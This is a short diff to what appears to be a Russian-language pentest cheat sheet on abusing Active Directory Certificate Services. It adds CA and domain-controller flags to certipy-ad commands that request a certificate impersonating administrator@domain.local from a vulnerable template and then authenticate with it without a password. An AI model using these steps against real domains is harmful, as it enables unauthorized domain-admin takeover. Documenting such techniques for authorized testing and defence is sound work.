@@ -40,11 +40,11 @@ certipy-ad find -u user@domain -p pass -dc-ip <ip>
 ```bash
 certipy-ad req -u user@domain -p pass \
 -template VulnerableTemplate \
--upn administrator@domain.local
+-upn administrator@domain.local -ca ca_name -dc-ip <ip>
 ```
 
 ### 3) Аутентификация по сертификату (без пароля)
 ```bash
-certipy-ad auth -pfx admin.pfx
+certipy-ad auth -pfx admin.pfx -dc-ip <ip>
 ```
 
